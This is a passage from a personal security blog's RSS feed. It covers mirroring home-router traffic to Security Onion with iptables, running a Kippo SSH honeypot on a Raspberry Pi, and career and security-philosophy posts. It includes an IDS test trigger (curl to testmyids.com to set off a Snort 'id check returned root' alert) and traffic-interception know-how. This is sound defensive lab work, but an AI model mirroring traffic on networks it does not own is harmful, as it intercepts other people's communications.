&lt;p&gt;I don&amp;rsquo;t go into much detail in the configuration of Security Onion and subsequent tools, as the &lt;a href=&#34;http://code.google.com/p/security-onion/wiki/Installation&#34;&gt;Install Wiki&lt;/a&gt; and &lt;a href=&#34;http://www.irongeek.com/i.php?page=videos/basic-setup-of-security-onion-snort-snorby-barnyard-pulledpork-daemonlogger&#34;&gt;Iron Geek&amp;rsquo;s video&lt;/a&gt; do a fantastic job of that, but the following is a brief overview of how I set things up. For more background, the Security Onion &lt;a href=&#34;http://code.google.com/p/security-onion/w/list&#34;&gt;Wiki&lt;/a&gt; has a ton of great resources, a few of which I&amp;rsquo;ll refer to in a bit, IronGeek&amp;rsquo;s video walkthrough mentioned above, Doug Burk&amp;rsquo;s &lt;a href=&#34;http://www.irongeek.com/i.php?page=videos/derbycon2/2-2-9-doug-burks-security-onion-network-security-monitoring-in-minutes&#34;&gt;talk&lt;/a&gt; and the very detailed &lt;a href=&#34;http://code.google.com/p/security-onion/wiki/IntroductionWalkthrough&#34;&gt;walkthrough&lt;/a&gt; on the Security Onion Wiki give tons of detailed info on setup and configuration.&lt;/p&gt;

&lt;p&gt;Useful things before starting, depending on use case:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Dedicated machine(s) for Security Onion&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Router/gateway supporting iptables&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;VirtualBox or VMware&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;First things first, a little research&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;I was somewhat at a loss on how to configure the actual network and mirror/span traffic to my laptop and Security Onion with only a simple Router. I&amp;rsquo;m running DD-WRT, but the router itself has no physical span ports. The Security Onion Wiki has a &lt;a href=&#34;http://code.google.com/p/security-onion/wiki/Hardware&#34;&gt;Hardware page&lt;/a&gt; which has a few links to cheap taps, but I didn&amp;rsquo;t necessarily want to go that route for a simple operation like this. After watching Iron Geek&amp;rsquo;s video, I was surprised I hadn&amp;rsquo;t realized the solution earlier. iptables can copy all traffic (via -tee). And if you have iptables on the router, voila.&lt;/p&gt;

&lt;p&gt;I wanted something like this. Actually, this is a dumb diagram, mostly I just wanted to use &lt;a href=&#34;http://www.asciiflow.com&#34;&gt;asciiflow.com&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;                             +-------------+
                             | Ze Internet |
                             +------+------+
                                    |
                              +-----v-----+       +------------+
                              |  Router   |       | Security   |
                              |           +------&amp;gt;| Onion      |
                              +-----+-----+       +------------+
                                    ^     xx
                    +---------------+------+x
                    |               |       xx
            +-----+------+   +------+---+    xx
            |  Desktop   |   | Laptop   |  Tablet, Phone, etc
            +------------+   +----------+
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Let&amp;rsquo;s Get Going Already!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Still doing some prep work, I had to get Security Onion installed on my laptop and since I didn&amp;rsquo;t want to lose my existing setup I chose to install in a VM. But before actually starting this goodness that is Security Onion, there is some configuration to do. We need lots of disk space, and a good amount of ram. We also need to configure our network adapter settings. As you will see while reading the Installation directions, Security Onion needs two NICs: one for monitoring, and one for management (wireless in my case). In the VM settings, I set Adapter 1 to bridge with my wired connection, and used Promiscuous Mode: All. I set Adapter 2 to bridge with my wireless connection and Promiscuous Mode: Deny. You can read a lot more info on that and VM networking settings &lt;a href=&#34;http://www.virtualbox.org/manual/ch06.html#network_bridged.&#34;&gt;here.&lt;/a&gt; I&amp;rsquo;m certain there are more ways to configure this, but this works.&lt;/p&gt;

&lt;p&gt;Once your VM settings are good, you&amp;rsquo;re left with actually installation and configuration. Installation itself is not too difficult if you can read directions. Lengthy and very detailed installation doc on the Security Onion &lt;a href=&#34;http://code.google.com/p/security-onion/wiki/Installation&#34;&gt;Install Wiki &lt;/a&gt;as well as the &lt;a href=&#34;http://code.google.com/p/security-onion/wiki/IntroductionWalkthrough&#34;&gt;walkthrough&lt;/a&gt;. Further configuration of tools and alerts takes more time, and some of that is nicely covered in Iron Geek&amp;rsquo;s video.&lt;/p&gt;

&lt;p&gt;Now that we have Security Onion set up and configured, lets point all the traffic towards it. As mentioned before, I&amp;rsquo;m going to do that with iptables as referenced &lt;a href=&#34;http://www.myopenrouter.com/article/10917/Port-Mirroring-Span-Port-Monitor-Port-with-iptables-on-NETGEAR-WGR614L/&#34;&gt;here&lt;/a&gt;. In DD-WRT, this can be done via ssh or Admin &amp;gt; Commands and entering:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;iptables -A PREROUTING -t mangle -j ROUTE --gw &amp;lt;IP of Sec Onion box&amp;gt; --tee    
iptables -A POSTROUTING -t mangle -j ROUTE --gw &amp;lt;IP of Sec Onion box&amp;gt; --tee

Note: I&#39;m actually using the host&#39;s bridged wired interface here as Security 
      Onion&#39;s monitoring interface is not assigned an IP address.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Save Firewall and test things out!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Causing High Severity Incidents&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;A simple ping from one of your devices to the router should show up, or a more sure-fire way to see an event is to go to, or &lt;em&gt;curl&lt;/em&gt; &lt;em&gt;http:/testmyids.com,&lt;/em&gt; which simply returns _uid=0(root) gid=0(root) groups=0(root). _In Snorby you should see a Sev 2 &amp;ldquo;GPL ATTACK_RESPONSE id check returned root&amp;rdquo; event, from which you can dig into further and see Payload, the Snort rule, and so on.&lt;/p&gt;

&lt;p&gt;If so, things are good! If not, there are lots of great resources out there, not least the &lt;a href=&#34;http://code.google.com/p/security-onion/w/list.&#34;&gt;Wiki pages  &lt;/a&gt;I&amp;rsquo;m off to test things out; Security Onion has a ton of tools to get to know. Good luck!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Kippo on the Raspberry Pi</title>
      <link>https://www.thesubtlety.com/post/kippo-on-the-raspberry-pi/</link>
      <pubDate>Tue, 07 May 2013 01:43:15 +0000</pubDate>
      
      <guid>https://www.thesubtlety.com/post/kippo-on-the-raspberry-pi/</guid>
      <description>&lt;p&gt;I recently bought a Raspberry Pi and installed &lt;a href=&#34;http://archlinuxarm.org/platforms/armv6/raspberry-pi#qt-platform_tabs-ui-tabs2&#34;&gt;Arch Linux ARM&lt;/a&gt; on it. I came across a rather amusing blog post of someone using the &lt;a href=&#34;https://en.wikipedia.org/wiki/Honeypot_(computing)&#34;&gt;honeypot&lt;/a&gt; &lt;a href=&#34;https://code.google.com/p/kippo/&#34;&gt;Kippo&lt;/a&gt; and thought what fun. See &lt;a href=&#34;http://www.iwatchedyourhack.org/&#34;&gt;here&lt;/a&gt; to watch elite hackers and their mad skillz. That&amp;rsquo;s the great thing about Kippo - it records user sessions for playback.&lt;/p&gt;

&lt;p&gt;Anyways, this post basically walks through what I did to get Kippo and &lt;a href=&#34;http://bruteforce.gr/kippo-graph&#34;&gt;kippo-graph&lt;/a&gt; up and running on my RPi. This isn&amp;rsquo;t a walk-you-through-every-step guide, so if you&amp;rsquo;re following along your mileage may vary. Of course, the &lt;a href=&#34;https://code.google.com/p/kippo/w/list&#34;&gt;Wiki pages&lt;/a&gt; over on Google Code are a good place to start. Or &lt;a href=&#34;http://bruteforce.gr/installing-kippo-ssh-honeypot-on-ubuntu.html&#34;&gt;here&lt;/a&gt;. Or &lt;a href=&#34;http://www.ctrl-alt-del.cc/2010/07/making-new-friends-with-kippo.html&#34;&gt;here&lt;/a&gt;. Everyone&amp;rsquo;s done this! But without further adieu&amp;hellip;&lt;/p&gt;

&lt;p&gt;Install all the dependencies. You need svn to pull the source which is easy enough, and Kippo has several dependencies as well. These would Python 2.5+, Twisted 8+, PyCrypto, and Zope-interface. Don&amp;rsquo;t do like I did and install the default Python 3+. Apparently there was a change to the print statement (become a function) and I was getting syntax errors. Downgraded and all was peachy. Rename the kippo.cfg.dist file to kippo.cfg and make changes as you please.&lt;/p&gt;

&lt;p&gt;Kippo runs on port 2222 by default and you can probably leave this as is. There are a &lt;a href=&#34;https://code.google.com/p/kippo/wiki/MakingKippoReachable&#34;&gt;couple&lt;/a&gt; methods to get Kippo running on port 22, and I chose to use iptables. I&amp;rsquo;ll come back to that. I also wanted to be able to access my RPi using SSH, and if we have iptables pointing port 22 to Kippo, well that&amp;rsquo;s no good. Let&amp;rsquo;s &lt;code&gt;sudo vi /etc/ssh/sshd_config&lt;/code&gt; and change the default port to something else, like 2220 or something and restart sshd.&lt;/p&gt;

&lt;p&gt;Next, we want packets destined for port 22 to be redirected to Kippo. This can be accomplished using the iptables command&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;~#iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And saving with &lt;code&gt;iptables-save &amp;gt; /etc/iptables/iptables.rules&lt;/code&gt;. You may need to &lt;code&gt;sudo -i&lt;/code&gt; first as piping to output runs as the current user. Kippo isn&amp;rsquo;t running as root is it? No, of course not, you wouldn&amp;rsquo;t do that.&lt;/p&gt;

&lt;p&gt;Cool. Now start Kippo. Running netstat on the RPi should show Kippo (seen below as python2) listening on 2222 and SSH listening on 2220.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[pi@myRPi kippo]$ sudo netstat -antp
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:2220           0.0.0.0:*               LISTEN      113/sshd            
tcp        0      0 0.0.0.0:2222           0.0.0.0:*               LISTEN      266/python2                          
tcp        0      0 192.168.1.229:2222     192.168.10.199:42451    ESTABLISHED 208/sshd: pi [priv]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And running nmap on my RPi from my desktop shows that port 22 is also listening, so we know iptables is properly accepting and forwarding packets. Note the ssh-hostkey is the same for both ports 22 and 2222.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;np@whereami [03:26:17] [~] 
-&amp;gt; % sudo nmap -A -sS myRPi -p 1-2222
Starting Nmap 6.25 ( http://nmap.org ) at 2013-05-04 15:26 EDT
Nmap scan report for myRPi (192.168.10.229)
Host is up (0.00045s latency).
Not shown: 22220 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 5.1p1 Debian 5 (protocol 2.0)
|_ssh-hostkey: 1024 50:d3:4e:ac:6d:2e:94:66:ac:02:ce:9b:f9:b7:cd:69 (RSA)
2222/tcp open  ssh     OpenSSH 5.1p1 Debian 5 (protocol 2.0)
|_ssh-hostkey: 1024 50:d3:4e:ac:6d:2e:94:66:ac:02:ce:9b:f9:b7:cd:69 (RSA)
2220/tcp open  ssh     OpenSSH 6.2 (protocol 2.0)
| ssh-hostkey: 1024 e3:9c:96:42:e6:4c:f0:53:d4:44:31:cd:f3:e5:35:89 (DSA)
| 2048 85:38:a1:25:da:9f:8d:d7:24:f7:ed:37:ae:76:e3:43 (RSA)
|_256 39:34:f2:83:ac:a4:43:ff:d0:4b:9d:3b:ac:d0:bf:48 (ECDSA)
MAC Address: B8:27:EB:33:BE:85 (Raspberry Pi Foundation)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You can test logging into both regular SSH via &lt;code&gt;ssh -p 2220 user@RPi&lt;/code&gt; or to Kippo using &lt;code&gt;ssh root@RPi&lt;/code&gt; which will default to port 22.&lt;/p&gt;

&lt;p&gt;Not quite finished, though. We need to make port 22 available to the world, and this can be accomplished by port forwarding at the router. My RPi has a static IP address, so logging into my router, I simply forwarded port 22 to my RPi&amp;rsquo;s port 22. If you want to check and see if this is working, something like &lt;a href=&#34;http://www.yougetsignal.com/tools/open-ports/&#34;&gt;You Get Signal&lt;/a&gt; can tell you if it&amp;rsquo;s open or not.&lt;/p&gt;

&lt;p&gt;Kippo&amp;rsquo;s logs can be viewed in the installation folders /log/kippo.log. This is raw output, though and I wanted something prettier. As I alluded to earlier, I used &lt;a href=&#34;http://bruteforce.gr/kippo-graph&#34;&gt;Kippo-graph&lt;/a&gt;. Kippo-graph requires running an apache server, MariaDB (MySQL drop-in), and PHP, so those will need installed as well. I used the mysql_secure_installation and &lt;a href=&#34;http://bruteforce.gr/logging-kippo-events-using-mysql-db.html&#34;&gt;this guide&lt;/a&gt; for basic configuration of the database and Kippo&amp;rsquo;s configuration. And this &lt;a href=&#34;https://wiki.archlinux.org/index.php/LAMP&#34;&gt;fantastic Arch guide&lt;/a&gt; to get Apache and PHP configured. Pay attention to the PHP config file and ensure the correct modules are enabled. I missed un-commenting and was getting a blank screen when I tried to generate graphs. Also note that graphs will appear broken until the database has something captured.&lt;/p&gt;

&lt;p&gt;Once everything is configured, restart the httpd service and browse to wherever you&amp;rsquo;ve hosted those files, e.g. &lt;code&gt;http://myRPi:80&lt;/code&gt; and peruse away. Of course there won&amp;rsquo;t be much to peruse initially, but all in good time my friend. &lt;/p&gt;

&lt;p&gt;Now to let this thing run for a bit and see what it catches!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Career README.txt</title>
      <link>https://www.thesubtlety.com/post/career-readme-txt/</link>
      <pubDate>Thu, 04 Apr 2013 00:50:49 +0000</pubDate>
      
      <guid>https://www.thesubtlety.com/post/career-readme-txt/</guid>
      <description>&lt;p&gt;I read this &lt;a href=&#34;http://www.kalzumeus.com/2011/10/28/dont-call-yourself-a-programmer&#34;&gt;article&lt;/a&gt; by Patrick McKenzie a while back, came across it again, and decided it&amp;rsquo;s worth reading weekly. I&amp;rsquo;ve pulled out some of his bolded points. But seriously, read the article in it&amp;rsquo;s entirety. Again. And again.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Don&amp;rsquo;t Call Yourself a Programmer, And Other Career Advice&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Modesty is not a career enhancing character trait&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Network. In person.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Learn how to negotiate&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Get good at Enterprise Sales&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Most jobs are never available publicly&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;You really want to be attached to Profit Centers&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Describe yourself by what you have accomplished for previous employers vis-a-vis increasing revenues or reducing costs&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;You radically overestimate the average skill of the competition because of the crowd you hang around with&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;I like this one: Business decisions are made by relatives of chimps, not by rules or algorithms&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Your most important skill is communication. Give the perception that you create value&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;People who are skilled in negotiation make more than those who are not&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Engineers are hired to create business value, not to program things&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Happiness will not be dominated by your career. Work to live.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Rob Fuller on Getting a Job in InfoSec</title>
      <link>https://www.thesubtlety.com/post/rob-fuller-on-getting-a-job-in-infosec/</link>
      <pubDate>Fri, 22 Feb 2013 01:12:37 +0000</pubDate>
      
      <guid>https://www.thesubtlety.com/post/rob-fuller-on-getting-a-job-in-infosec/</guid>
      <description>&lt;p&gt;I was fortunate enough to get a good job in IT right out of college. Not in InfoSec, but in telecom, and in specific, service delivery. I&amp;rsquo;m learning an incredible amount - from enterprise telephony environment to working in a highly complex work environment to leading delivery on new intent projects. But it&amp;rsquo;s not InfoSec.&lt;/p&gt;

&lt;p&gt;In my search for ways to break into InfoSec, I&amp;rsquo;ve come across numerous &lt;a href=&#34;https://www.schneier.com/blog/archives/2012/07/how_to_become_a_1.html&#34;&gt;posts&lt;/a&gt;, &lt;a href=&#34;http://pauldotcom.com/2009/05/getting-started-in-information.html&#34;&gt;advice&lt;/a&gt;, and &lt;a href=&#34;https://krebsonsecurity.com/category/how-to-break-into-security/&#34;&gt;tips&lt;/a&gt; to do just that. And this is great stuff - I&amp;rsquo;m working on the learning and the doing covered in those posts. But I really enjoyed the clear, common sense advice on building a  resume, the job search, interview techniques, brand building, and general career advice given by Rob Fuller. Watch the presentation &lt;a href=&#34;http://vimeo.com/4108726&#34;&gt;here&lt;/a&gt;. (About 50 minutes)&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>On the Dumbest Ideas in Computer Security</title>
      <link>https://www.thesubtlety.com/post/on-the-dumbest-ideas-in-computer-security/</link>
      <pubDate>Sat, 15 Sep 2012 22:22:40 +0000</pubDate>
      
      <guid>https://www.thesubtlety.com/post/on-the-dumbest-ideas-in-computer-security/</guid>
      <description>&lt;p&gt;The other day I came across an article by &lt;a href=&#34;http://en.wikipedia.org/wiki/Marcus_J._Ranum&#34;&gt;Marcus J Ranum&lt;/a&gt; on &lt;a href=&#34;http://www.ranum.com/security/computer_security/editorials/dumb/index.html&#34;&gt;the six dumbest ideas in computer security&lt;/a&gt; which were very simple yet struck me as profound. I&amp;rsquo;ll summarize them here for future reference.&lt;/p&gt;

&lt;p&gt;1) Default Permit&lt;/p&gt;

&lt;p&gt;Back when computer networks were still in their infancy, there were few avenues for attack. With those avenues turned off, all else was allowed. Hence &amp;ldquo;default permit.&amp;rdquo; Another area is code execution: anything clicked is permitted to run, unless stopped by antivirus or the likes. The proper solution here is default deny, but this, according to Ranum, takes dedication, thought, and understanding, and so is seldom done. And it allows one to sleep better at night.&lt;/p&gt;

&lt;p&gt;2) Enumerating Badness&lt;/p&gt;

&lt;p&gt;This is a subset of Default Permit, but is interesting as well. As mentioned previously, there were only a few avenues for attack, so if you blocked those vectors, you should be good, right? No, this is &amp;ldquo;enumerating badness.&amp;rdquo; This is a dumb idea because of the incredible amount of badness that exists. Antivirus tries to track the thousands and thousands of viruses, etc and stop them, rather than a solution that tracks the (very few) legitimate applications that regularly run and deny all else. Why is this not a consumer solution in today&amp;rsquo;s world?&lt;/p&gt;

&lt;p&gt;Another great concept is that of &lt;a href=&#34;http://www.ranum.com/security/computer_security/papers/ai/index.html&#34;&gt;&amp;ldquo;Artificial Ignorance&amp;rdquo;&lt;/a&gt;, where you get rid of uninteresting log entries, and keep all else, which, if they are not uninteresting, must be interesting.&lt;/p&gt;

&lt;p&gt;3) Penetrate and Patch&lt;/p&gt;

&lt;p&gt;In regards to one&amp;rsquo;s online resource, you attack it as an attacker would, find a flaw, fix it, and continue searching. There is a brilliant term for this as Ranum says: &amp;ldquo;turd polishing.&amp;rdquo; This process does nothing to make your code better in the long run, but management likes the improved, shiny appearance in the short term. It does not improve the design, rather &amp;ldquo;toughens by trial and error.&amp;rdquo; This seems obvious when one thinks about it, but it is so prevalent that one hardly realizes how dumb it is. Vulnerability researchers publish holes, and holes are patched.&lt;/p&gt;

&lt;p&gt;But if vendors wrote code &amp;ldquo;designed to be secure and reliable, then vulnerability discovery would be tedious.&amp;rdquo; Think Internet Explorer: vulnerabilities have been found for over ten years. Ranum says pen-testing is pointless and pointless is dumb, because one will either find numerous bugs, or nothing comprehensible. Secure by design!&lt;/p&gt;

&lt;p&gt;4) Hacking is Cool&lt;/p&gt;

&lt;p&gt;Ranum say here that &amp;ldquo;hacking is a social problem.&amp;rdquo; With internet anonymity, timid people can become criminals, and media portrays them as &amp;ldquo;whiz kids&amp;rdquo;. Ultimately, teaching oneself exploits means investing time learning tools and techniques that become useless when everyone has patched that particular hole. Ones professional skill-set &amp;ldquo;becomes dependent on penetrate and patch&amp;rdquo; and you have arms race again.&lt;/p&gt;

&lt;p&gt;While I see what Ranum is saying here, I believe knowing how these exploits work, and how holes are exploited is still useful to know. I do entirely agree with this statement, though: &amp;ldquo;it would be more sensible to design security systems that are hack-proof than to learn how to identify security systems that are dumb.&amp;rdquo;&lt;/p&gt;

&lt;p&gt;5) Educating Users&lt;/p&gt;

&lt;p&gt;This is interesting as well, because it, too, seems so prevalent and accepted today. Education is good, right? If &amp;ldquo;educating users was going to work, it would have worked by now.&amp;rdquo; People are easily socially engineered. Ranum likens it to penetrate and patch, and having to &amp;ldquo;patch&amp;rdquo; users every week. He asks &amp;ldquo;why do we need to educate users at all?&amp;rdquo; This is like Default Permit again - &amp;ldquo;Why are users getting executable attachments at all?&amp;rdquo; The root issue is not dumb users, but rather the security architecture that is broken.&lt;/p&gt;

&lt;p&gt;6) Action is Better than Inaction&lt;/p&gt;

&lt;p&gt;Here we have &amp;ldquo;early adopters&amp;rdquo; and &amp;ldquo;pause and thinkers.&amp;rdquo; Ranum says &amp;ldquo;pause and thinkers&amp;rdquo; build more successful, secure, mission-critical systems. He illustrates this with &amp;ldquo;one senior IT executive&amp;rsquo;s roll out plan for a wireless corporate network was &amp;lsquo;wait two years and hire the guy who did a successful wireless deployment for a company larger than us.&amp;rsquo; The technology will be more mature and cheaper by then.&amp;rdquo;&lt;/p&gt;

&lt;p&gt;So: to myself or another reader who has stumbled along this far, I highly recommend (re)reading Ranums entire article. And maybe check out his website, which is full of interesting links. I think a takeaway here is to identify the root cause and fix that, rather than continue turd polishing everything in sight; that is surely a losing battle.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Breaking into Security</title>
      <link>https://www.thesubtlety.com/post/breaking-into-security/</link>
      <pubDate>Mon, 25 Jun 2012 18:21:26 +0000</pubDate>
      
      <guid>https://www.thesubtlety.com/post/breaking-into-security/</guid>
      <description>&lt;p&gt;This blogging thing is harder than it seems - the what to write, the time to write. I came across another interesting blog post from &lt;a href=&#34;http://m.krebsonsecurity.com/2012/06/how-to-break-into-security-ptacek-edition/&#34;&gt;Krebs on Security&lt;/a&gt;,  who interviewed Thomas Ptackek, founder of Matasano Security, on how to get into the field of computer security. As this is precisely my intent, I gave it a quick read through and thought to post a to-do for myself.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Learn how to program. Plugging away with Ruby. Get dabbling in Python and C.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Set up a home lab for experimenting&lt;em&gt;. Done.&lt;/em&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Install an old version of Wordpress on a VM.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Use WebScarab or Burp Suite on your ancient Wordpress site.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;The best jobs in the field are in application security.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Position yourself near custom software development or get a role in QA.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Find opportunities to practice in your job.&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;This is exciting and encouraging! And because I&amp;rsquo;m already started on a couple of these things, I&amp;rsquo;m well on my way. Thanks Brian Krebs and Thomas Ptacek!&lt;/p&gt;

&lt;p&gt;By the way, the &lt;a href=&#34;http://www.matasano.com/careers/&#34;&gt;careers page&lt;/a&gt; of Matasano security is awesome as far as what to expect when interviewing for a pen testing job.&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>